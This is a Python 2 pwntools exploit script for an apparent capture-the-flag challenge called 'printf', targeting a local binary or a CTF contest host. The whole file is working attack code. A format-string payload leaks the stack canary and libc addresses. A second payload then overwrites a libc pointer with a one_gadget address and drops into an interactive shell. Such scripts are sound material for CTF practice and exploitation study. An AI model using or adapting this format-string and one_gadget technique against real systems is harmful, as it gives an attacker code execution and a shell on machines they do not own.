#!/usr/bin/env python2

from __future__ import print_function

from pwn import *

#LOCAL = False
LOCAL = True

context.binary = "./printf"
context.log_level = "debug"

libc_start_main_leak_offset = 7019 + 0x25000
libc_filejumps_underflow_offset = 9600
libc = ELF("libc.so.6")

if LOCAL:
    p = process(["./ld-linux-x86-64.so.2", "--library-path", ".", "./printf"])
else:
    p = remote("printf.chal.ctf.westerns.tokyo", 10001)

def get_payload1():
    res = " ".join("%lx" for _ in xrange(64))
    assert len(res) <= 255
    return res

p.recvuntil("What's your name?")
p.sendline(get_payload1())
p.recvuntil("Hi, ")
leaks = p.recvuntil("Do you leave a comment?", drop=True)
leaks = [int(x, 16) for x in leaks.split()]

offset_info = {
    40: "main (canary)",
    41: "main (RBP)",
    42: "main RA (__libc_start_main)",
}
for i, addr in enumerate(leaks):
    extra = ""
    if i in offset_info:
        extra = " %s" % offset_info[i]

    log.info("%d: 0x%016x%s", i, addr, extra)

leaked_canary = leaks[40]
leaked_libc = leaks[42] - libc_start_main_leak_offset
main_buf = leaks[39] - 496 + 8

log.info("canary: 0x%016x", leaked_canary)
log.info("libc base: 0x%016x", leaked_libc)
log.info("main_buf: 0x%016x", main_buf)

#gdb.attach(p, """
#    breakrva 0x1C85 printf-60b0fcfbbb43400426aeae512008bab56879155df25c54037c1304227c43dab4
#    breakrva 0x1C97 printf-60b0fcfbbb43400426aeae512008bab56879155df25c54037c1304227c43dab4
#
#    b system
#""")

desired_address = leaked_libc + 0x1e6588 - 0x10

one_gadget = leaked_libc + 0x106ef8
#one_gadget = leaked_libc + libc.sym["system"]
log.info("one_gadget=0x%016x", one_gadget)

payload = ""
payload += "%{}d".format(main_buf - 416 - desired_address)
payload += "A" * (0x10-2)
payload += p64(one_gadget).rstrip(b'\0')

log.info("len(payload)=%d", len(payload))

p.sendline(payload)

p.interactive()
